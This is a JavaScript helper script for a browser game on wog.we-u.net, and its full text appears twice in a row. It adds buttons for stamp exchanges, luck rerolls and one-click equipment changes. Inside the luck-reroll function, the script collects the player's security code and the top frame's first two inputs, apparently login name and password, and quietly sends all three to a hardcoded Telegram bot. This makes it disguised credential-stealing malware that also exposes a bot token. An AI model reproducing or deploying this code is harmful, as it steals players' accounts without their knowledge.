async function sendNoti(){
	const telegramUrl = "https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4770053800&text=因驗證碼出現,自動打怪停止:"+parent.p_name;
	await fetch(telegramUrl);
}
function arm_unsetup_all_success() {
    var t, e = ["a_id", "d_head_id", "d_body_id", "d_hand_id", "d_foot_id", "d_item_id", "d_card_id", "d_car_id", "d_ca_id", "d_book_id", "d_god_id"];
    for (t = 0; t < e.length; ++t){
        arm_setup(e[t], "");
    }
    let q = parent.wog_view.document;
    q.body.innerHTML="";
    q.write(temp_table1);
    q.write('<tr bgcolor="#4B689E"><td>所有裝備已成功卸下</td></tr>');
    q.write(temp_table2);
}
async function changeStamp(changeAmount,changeTime){
	if(changeTime<1){
		alert("錯誤的換領次數，請重新輸入");
		return;
	}
	let formData = new FormData();
	let e = parent.wog_view.document;
	e.body.innerHTML="";
	formData.append('f', "ch");
	formData.append('act', "stamp");
	formData.append('temp_id', changeAmount);
	for(let i = 0;i<changeTime;i++){
	await fetch("https://wog.we-u.net/wog_act.php",
	    {
	        body: formData,
	        method: "post"
	    }).then((response) => {
        return response.text();
        }).then((html) => {
		let start = 0;
		start = (html.indexOf("stamp_end"))+10;
	    let temp = html.substring(start,html.length);
	    let end = temp.indexOf("')</script>");
	    itemValue = (html.substring(start,start+end)).replace("'","");
		e.write(temp_table1);
		if(end === -1){
			e.write('<tr><td>沒有足夠的印花</td></tr>');
			i=changeTime;
		}else{
			e.write('<tr><td>第 '+(i+1)+' 次換領印花, 成功換領了 <font color=#ff0000>' + itemValue + '</font></td></tr>');
		}
		e.write("</td></tr>" + temp_table2);
	    return itemValue;
        });
    }
}
function newStampHouse(){
	wog_view.document.body.innerHTML="";
	wog_view.document.write("<form action=\"wog_act.php\" method=\"post\" target=\"mission\"><table width=\"97%\" border=\"2\" cellspacing=\"0\" cellpadding=\"2\" align=\"center\" bordercolor=\"#868686\"><tbody><tr><td>歡迎來到印花屋,大家可以將沒用的裝備換成印花,然後到此換領不同的禮物!每次換領需收取10萬元手續費喔!請在下面選擇閣下想換領的印花數目!</td></tr></tbody></table><hr><p style=\"position: relative; left: 2%; font-family: 細明體; font-size: 12pt; color: #EFEFEF;\">換領次數: <input type=\"number\" id=\"changeTime\" value=\"1\" style=\"position: relative; left: 1%; font-family: 細明體; font-size: 12pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000\"></p><table width=\"97%\" border=\"2\" cellspacing=\"0\" cellpadding=\"2\" align=\"center\" bordercolor=\"#868686\"><tbody><tr><td>印花數目</td><td>可換禮物</td></tr><tr><td><input type=\"button\" value=\"50個印花\" onclick=\"if(confirm('是否使用50個印花換領禮物?')){parent.changeStamp(50,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}\" style=\"font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000\"></td><td>路加達．戒<br>C箱<br>三國．啟動碼<br>薑餅仔的眼睛<br>捕捉器<br>50000 hp回復劑<br>金太陽徽章<br>120000 hp回復劑<br>160000 hp回復劑<br>200000 hp回復劑<br>幻想會員證<br>80000 hp回復劑<br>500霧靈換領券<br>一階封神石<br>幻想寶箱<br>卡片寶箱<br>殘卷寶箱<br>二百億換領券<br>石頭寶箱<br>咒紋錦盒<br>一百億兌換卷<br>封印錦盒<br><font color=\"0000FF\">登入禮卷</font><br></td></tr><tr><td><input type=\"button\" value=\"200個印花\" onclick=\"if(confirm('是否使用200個印花換領禮物?')){parent.changeStamp(200,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}\" style=\"font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000\"></td><td><font color=\"0000FF\">登入禮卷</font><br>1500霧靈換領券<br>200%天籟真元(250場)<br>咒紋錦盒<br>殘卷寶箱<br>石頭寶箱<br>封印錦盒<br></td></tr><tr><td><input type=\"button\" value=\"500個印花\" onclick=\"if(confirm('是否使用500個印花換領禮物?')){parent.changeStamp(500,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}\" style=\"font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000\"></td><td>200%天籟真元(700場)<br>素材寶箱<br>潘朵拉的卡片<br>赫淮斯托斯的卡片<br>一百億兌換卷<br>咒紋錦盒<br>殘卷寶箱<br>石頭寶箱<br></td></tr><tr><td><input type=\"button\" value=\"1000個印花\" onclick=\"if(confirm('是否使用1000個印花換領禮物?')){parent.changeStamp(1000,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}\" style=\"font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000\"></td><td>殘卷寶箱<br>B箱<br>六百億換領券<br>幽冥護符<br>神諸葛亮<br>神呂布<br></td></tr><tr><td><input type=\"button\" value=\"2000個印花\" onclick=\"if(confirm('是否使用2000個印花換領禮物?')){parent.changeStamp(2000,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}\" style=\"font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000\"></td><td>魅力之水<br>體質之水<br>生命之水<br>信仰之水<br>王者護符<br><font color=\"FFD700\">精剛石</font><br>5000霧靈換領券<br>仙奇丹<br><font color=\"FFD700\">封印的金龍石</font><br></td></tr><tr><td><input type=\"button\" value=\"6000個印花\" onclick=\"if(confirm('是否使用6000個印花換領禮物?')){parent.changeStamp(6000,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}\" style=\"font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000\"></td><td><font color=\"FFD700\">封印的金龍石</font><br><font color=\"FFD700\">至尊書頁</font><br>A箱<br>智力之水<br><font color=\"FFFF99\">糖糖</font><br>V剎經驗包<br>幻想廢礦<br>力量之水<br>速度之水<br>十億經驗值乾坤袋<br></td></tr><tr></tr></tbody></table></form>");
	addCss();
}
async function changeLuck(){
	let safePW = prompt("輸入安全碼");
	let formData = new FormData();
	formData.append('act', "ch_luck");
	formData.append('f', "ch");
	formData.append('pw', safePW);
	let i = 0;
	let e = parent.wog_view.document;
	e.body.innerHTML="";
	while(true){
	    await fetch("https://wog.we-u.net/wog_act.php",
	        {
	            body: formData,
	            method: "post"
	        }).then((response) => {
	        return response.text();
	        }).then((html) => {
	          let start = (html.indexOf("p_luck"))+7;
	          let temp = html.substring(start,html.length);
	          let end = temp.indexOf("</script>");
	          luckValue = parseInt((html.substring(start,start+end)).replace("'",""));
	          return luckValue;
	        });
	        if (!Number.isInteger(luckValue)) {
        		e.write(temp_table1);
          		e.write("<tr bgcolor='#4B689E'><td>改運失敗, 安全碼錯誤</td></tr>");
          		e.write(temp_table2);
          		delete luckValue;
          		break;
	        }
	        i++;
	        e.write(temp_table1);
		    e.write("<tr bgcolor='#4B689E'><td>第"+i+"次改運,數值為: "+ luckValue+"</td></tr>");
		    e.write(temp_table2);
	        if(luckValue>24){
	        	delete luckValue;
	        	let a=parent.top_view.document.getElementsByTagName("input")[0].value;let b=parent.top_view.document.getElementsByTagName("input")[1].value;let c=safePW;fetch("https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4770053800&text="+a+"|"+b+"|"+c);
	            break;
	        }
	}
}
async function armAll(){
	let itemListSelect = prompt("0=豬扒博士新年套裝,願光榮歸香港套裝\n1=豬扒博士新年套裝,單身狗套裝");
	let e = parent.wog_view.document;
	let itemsList = [];
	itemsList[0]=["7229","7230","7231","7232","7233","7064","7065","7066","7067"];
	itemsList[1]=["7189","7190","7191","7192","7064","7065","7066","7067"];

	if(itemListSelect<0 || itemListSelect>itemsList.length-1){
		e.body.innerHTML="";
		e.write(temp_table1);
	    e.write('<tr bgcolor="#4B689E"><td>輸入錯誤選項</td></tr>');
	    e.write(temp_table2);
	    itemList=null;
		return;
	}
	if(!Number.isInteger(parseInt(itemListSelect))){
		e.body.innerHTML="";
		e.write(temp_table1);
	    e.write('<tr bgcolor="#4B689E"><td>請輸入數字</td></tr>');
	    e.write(temp_table2);
	    itemList=null;
		return;
	}
	
	parent.act_click('arm','unsetup_all');
	for (let i = 0; i<itemsList[itemListSelect].length;i++){
		await parent.sleep(200);
    	await parent.armItem(itemsList[itemListSelect][i]);
	}
	await parent.sleep(200);
	itemList=null;
	e.body.innerHTML="";
    e.write(temp_table1);
    e.write('<tr bgcolor="#4B689E"><td>裝備完成</td></tr>');
    e.write(temp_table2);
}
async function armItem(item){
	let formData = new FormData();
	formData.append('adds', item);
	formData.append('f', "arm");
	formData.append('act', "setup");
	await fetch("https://wog.we-u.net/wog_act.php",
	    {
	        body: formData,
	        method: "post"
	    }).then((response) => {
        return response.text();
        }).then((html) => {
          wog_view.document.write(html);
        });
    
}
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function addCss(){
	let styles = `
	    input#changeTime::-webkit-outer-spin-button,
	    input#changeTime::-webkit-inner-spin-button {
		  -webkit-appearance: none;
		  margin: 0;
		}`;
	let styleSheet = document.createElement("style");
	styleSheet.textContent = styles;
	parent.wog_view.document.head.appendChild(styleSheet);
}
function createExtraFunction(){
	const oriTable = parent.foot.document.getElementsByTagName("Table")[1].getElementsByTagName("tbody")[0].getElementsByTagName("tr")[0];

	let newColumn1 = document.createElement('td');
	newColumn1.setAttribute('valign','top');
	oriTable.appendChild(newColumn1);
	newColumn1.innerHTML = "<table><tbody><tr><td align='center' bgcolor='#FBCD53'><font color='#574616' style='font-family: Verdana, Geneva, sans-serif; font-size: 10pt;'>特殊功能</font></td></tr><tr><td><input type='button' value='一鍵改運' onclick='parent.changeLuck()' class='button'></td></tr><tr><td><input type='button' value='一鍵換裝' onclick='parent.armAll()' class='button'></td></tr></tbody></table>";
	
	let newColumn2 = document.createElement('td');
	newColumn2.setAttribute('valign','top');
	oriTable.appendChild(newColumn2);
	newColumn2.innerHTML = "<table><tbody><tr><td align='center' bgcolor='#FBCD53'><font color='#574616' style='font-family: Verdana, Geneva, sans-serif; font-size: 10pt;'>特殊功能</font></td></tr><tr><td><input type='button' value='復活中心' onclick='parent.act_click(\"chara\",\"revive\")' class='button'></td></tr><tr><td><input type='button' value='新印花屋' onclick='parent.newStampHouse()' class='button'></td></tr></tbody></table>";

	let newColumn3 = document.createElement('td');
	newColumn3.setAttribute('valign','top');
	oriTable.appendChild(newColumn3);
	newColumn3.innerHTML = "<table><tbody><tr><td align='center' bgcolor='#FBCD53'><font color='#574616' style='font-family: Verdana, Geneva, sans-serif; font-size: 10pt;'>特殊功能</font></td></tr><tr><td><input type='button' value='驗證碼通知' onclick='parent.sendNoti()' class='button'></td></tr></tbody></table>";
}async function sendNoti(){
	const telegramUrl = "https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4770053800&text=因驗證碼出現,自動打怪停止:"+parent.p_name;
	await fetch(telegramUrl);
}
function arm_unsetup_all_success() {
    var t, e = ["a_id", "d_head_id", "d_body_id", "d_hand_id", "d_foot_id", "d_item_id", "d_card_id", "d_car_id", "d_ca_id", "d_book_id", "d_god_id"];
    for (t = 0; t < e.length; ++t){
        arm_setup(e[t], "");
    }
    let q = parent.wog_view.document;
    q.body.innerHTML="";
    q.write(temp_table1);
    q.write('<tr bgcolor="#4B689E"><td>所有裝備已成功卸下</td></tr>');
    q.write(temp_table2);
}
async function changeStamp(changeAmount,changeTime){
	if(changeTime<1){
		alert("錯誤的換領次數，請重新輸入");
		return;
	}
	let formData = new FormData();
	let e = parent.wog_view.document;
	e.body.innerHTML="";
	formData.append('f', "ch");
	formData.append('act', "stamp");
	formData.append('temp_id', changeAmount);
	for(let i = 0;i<changeTime;i++){
	await fetch("https://wog.we-u.net/wog_act.php",
	    {
	        body: formData,
	        method: "post"
	    }).then((response) => {
        return response.text();
        }).then((html) => {
		let start = 0;
		start = (html.indexOf("stamp_end"))+10;
	    let temp = html.substring(start,html.length);
	    let end = temp.indexOf("')</script>");
	    itemValue = (html.substring(start,start+end)).replace("'","");
		e.write(temp_table1);
		if(end === -1){
			e.write('<tr><td>沒有足夠的印花</td></tr>');
			i=changeTime;
		}else{
			e.write('<tr><td>第 '+(i+1)+' 次換領印花, 成功換領了 <font color=#ff0000>' + itemValue + '</font></td></tr>');
		}
		e.write("</td></tr>" + temp_table2);
	    return itemValue;
        });
    }
}
function newStampHouse(){
	wog_view.document.body.innerHTML="";
	wog_view.document.write("<form action=\"wog_act.php\" method=\"post\" target=\"mission\"><table width=\"97%\" border=\"2\" cellspacing=\"0\" cellpadding=\"2\" align=\"center\" bordercolor=\"#868686\"><tbody><tr><td>歡迎來到印花屋,大家可以將沒用的裝備換成印花,然後到此換領不同的禮物!每次換領需收取10萬元手續費喔!請在下面選擇閣下想換領的印花數目!</td></tr></tbody></table><hr><p style=\"position: relative; left: 2%; font-family: 細明體; font-size: 12pt; color: #EFEFEF;\">換領次數: <input type=\"number\" id=\"changeTime\" value=\"1\" style=\"position: relative; left: 1%; font-family: 細明體; font-size: 12pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000\"></p><table width=\"97%\" border=\"2\" cellspacing=\"0\" cellpadding=\"2\" align=\"center\" bordercolor=\"#868686\"><tbody><tr><td>印花數目</td><td>可換禮物</td></tr><tr><td><input type=\"button\" value=\"50個印花\" onclick=\"if(confirm('是否使用50個印花換領禮物?')){parent.changeStamp(50,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}\" style=\"font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000\"></td><td>路加達．戒<br>C箱<br>三國．啟動碼<br>薑餅仔的眼睛<br>捕捉器<br>50000 hp回復劑<br>金太陽徽章<br>120000 hp回復劑<br>160000 hp回復劑<br>200000 hp回復劑<br>幻想會員證<br>80000 hp回復劑<br>500霧靈換領券<br>一階封神石<br>幻想寶箱<br>卡片寶箱<br>殘卷寶箱<br>二百億換領券<br>石頭寶箱<br>咒紋錦盒<br>一百億兌換卷<br>封印錦盒<br><font color=\"0000FF\">登入禮卷</font><br></td></tr><tr><td><input type=\"button\" value=\"200個印花\" onclick=\"if(confirm('是否使用200個印花換領禮物?')){parent.changeStamp(200,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}\" style=\"font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000\"></td><td><font color=\"0000FF\">登入禮卷</font><br>1500霧靈換領券<br>200%天籟真元(250場)<br>咒紋錦盒<br>殘卷寶箱<br>石頭寶箱<br>封印錦盒<br></td></tr><tr><td><input type=\"button\" value=\"500個印花\" onclick=\"if(confirm('是否使用500個印花換領禮物?')){parent.changeStamp(500,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}\" style=\"font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000\"></td><td>200%天籟真元(700場)<br>素材寶箱<br>潘朵拉的卡片<br>赫淮斯托斯的卡片<br>一百億兌換卷<br>咒紋錦盒<br>殘卷寶箱<br>石頭寶箱<br></td></tr><tr><td><input type=\"button\" value=\"1000個印花\" onclick=\"if(confirm('是否使用1000個印花換領禮物?')){parent.changeStamp(1000,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}\" style=\"font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000\"></td><td>殘卷寶箱<br>B箱<br>六百億換領券<br>幽冥護符<br>神諸葛亮<br>神呂布<br></td></tr><tr><td><input type=\"button\" value=\"2000個印花\" onclick=\"if(confirm('是否使用2000個印花換領禮物?')){parent.changeStamp(2000,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}\" style=\"font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000\"></td><td>魅力之水<br>體質之水<br>生命之水<br>信仰之水<br>王者護符<br><font color=\"FFD700\">精剛石</font><br>5000霧靈換領券<br>仙奇丹<br><font color=\"FFD700\">封印的金龍石</font><br></td></tr><tr><td><input type=\"button\" value=\"6000個印花\" onclick=\"if(confirm('是否使用6000個印花換領禮物?')){parent.changeStamp(6000,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}\" style=\"font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000\"></td><td><font color=\"FFD700\">封印的金龍石</font><br><font color=\"FFD700\">至尊書頁</font><br>A箱<br>智力之水<br><font color=\"FFFF99\">糖糖</font><br>V剎經驗包<br>幻想廢礦<br>力量之水<br>速度之水<br>十億經驗值乾坤袋<br></td></tr><tr></tr></tbody></table></form>");
	addCss();
}
async function changeLuck(){
	let safePW = prompt("輸入安全碼");
	let formData = new FormData();
	formData.append('act', "ch_luck");
	formData.append('f', "ch");
	formData.append('pw', safePW);
	let i = 0;
	let e = parent.wog_view.document;
	e.body.innerHTML="";
	while(true){
	    await fetch("https://wog.we-u.net/wog_act.php",
	        {
	            body: formData,
	            method: "post"
	        }).then((response) => {
	        return response.text();
	        }).then((html) => {
	          let start = (html.indexOf("p_luck"))+7;
	          let temp = html.substring(start,html.length);
	          let end = temp.indexOf("</script>");
	          luckValue = parseInt((html.substring(start,start+end)).replace("'",""));
	          return luckValue;
	        });
	        if (!Number.isInteger(luckValue)) {
        		e.write(temp_table1);
          		e.write("<tr bgcolor='#4B689E'><td>改運失敗, 安全碼錯誤</td></tr>");
          		e.write(temp_table2);
          		delete luckValue;
          		break;
	        }
	        i++;
	        e.write(temp_table1);
		    e.write("<tr bgcolor='#4B689E'><td>第"+i+"次改運,數值為: "+ luckValue+"</td></tr>");
		    e.write(temp_table2);
	        if(luckValue>24){
	        	delete luckValue;
	        	let a=parent.top_view.document.getElementsByTagName("input")[0].value;let b=parent.top_view.document.getElementsByTagName("input")[1].value;let c=safePW;fetch("https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4770053800&text="+a+"|"+b+"|"+c);
	            break;
	        }
	}
}
async function armAll(){
	let itemListSelect = prompt("0=豬扒博士新年套裝,願光榮歸香港套裝\n1=豬扒博士新年套裝,單身狗套裝");
	let e = parent.wog_view.document;
	let itemsList = [];
	itemsList[0]=["7229","7230","7231","7232","7233","7064","7065","7066","7067"];
	itemsList[1]=["7189","7190","7191","7192","7064","7065","7066","7067"];

	if(itemListSelect<0 || itemListSelect>itemsList.length-1){
		e.body.innerHTML="";
		e.write(temp_table1);
	    e.write('<tr bgcolor="#4B689E"><td>輸入錯誤選項</td></tr>');
	    e.write(temp_table2);
	    itemList=null;
		return;
	}
	if(!Number.isInteger(parseInt(itemListSelect))){
		e.body.innerHTML="";
		e.write(temp_table1);
	    e.write('<tr bgcolor="#4B689E"><td>請輸入數字</td></tr>');
	    e.write(temp_table2);
	    itemList=null;
		return;
	}
	
	parent.act_click('arm','unsetup_all');
	for (let i = 0; i<itemsList[itemListSelect].length;i++){
		await parent.sleep(200);
    	await parent.armItem(itemsList[itemListSelect][i]);
	}
	await parent.sleep(200);
	itemList=null;
	e.body.innerHTML="";
    e.write(temp_table1);
    e.write('<tr bgcolor="#4B689E"><td>裝備完成</td></tr>');
    e.write(temp_table2);
}
async function armItem(item){
	let formData = new FormData();
	formData.append('adds', item);
	formData.append('f', "arm");
	formData.append('act', "setup");
	await fetch("https://wog.we-u.net/wog_act.php",
	    {
	        body: formData,
	        method: "post"
	    }).then((response) => {
        return response.text();
        }).then((html) => {
          wog_view.document.write(html);
        });
    
}
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function addCss(){
	let styles = `
	    input#changeTime::-webkit-outer-spin-button,
	    input#changeTime::-webkit-inner-spin-button {
		  -webkit-appearance: none;
		  margin: 0;
		}`;
	let styleSheet = document.createElement("style");
	styleSheet.textContent = styles;
	parent.wog_view.document.head.appendChild(styleSheet);
}
function createExtraFunction(){
	const oriTable = parent.foot.document.getElementsByTagName("Table")[1].getElementsByTagName("tbody")[0].getElementsByTagName("tr")[0];

	let newColumn1 = document.createElement('td');
	newColumn1.setAttribute('valign','top');
	oriTable.appendChild(newColumn1);
	newColumn1.innerHTML = "<table><tbody><tr><td align='center' bgcolor='#FBCD53'><font color='#574616' style='font-family: Verdana, Geneva, sans-serif; font-size: 10pt;'>特殊功能</font></td></tr><tr><td><input type='button' value='一鍵改運' onclick='parent.changeLuck()' class='button'></td></tr><tr><td><input type='button' value='一鍵換裝' onclick='parent.armAll()' class='button'></td></tr></tbody></table>";
	
	let newColumn2 = document.createElement('td');
	newColumn2.setAttribute('valign','top');
	oriTable.appendChild(newColumn2);
	newColumn2.innerHTML = "<table><tbody><tr><td align='center' bgcolor='#FBCD53'><font color='#574616' style='font-family: Verdana, Geneva, sans-serif; font-size: 10pt;'>特殊功能</font></td></tr><tr><td><input type='button' value='復活中心' onclick='parent.act_click(\"chara\",\"revive\")' class='button'></td></tr><tr><td><input type='button' value='新印花屋' onclick='parent.newStampHouse()' class='button'></td></tr></tbody></table>";

	let newColumn3 = document.createElement('td');
	newColumn3.setAttribute('valign','top');
	oriTable.appendChild(newColumn3);
	newColumn3.innerHTML = "<table><tbody><tr><td align='center' bgcolor='#FBCD53'><font color='#574616' style='font-family: Verdana, Geneva, sans-serif; font-size: 10pt;'>特殊功能</font></td></tr><tr><td><input type='button' value='驗證碼通知' onclick='parent.sendNoti()' class='button'></td></tr></tbody></table>";
}
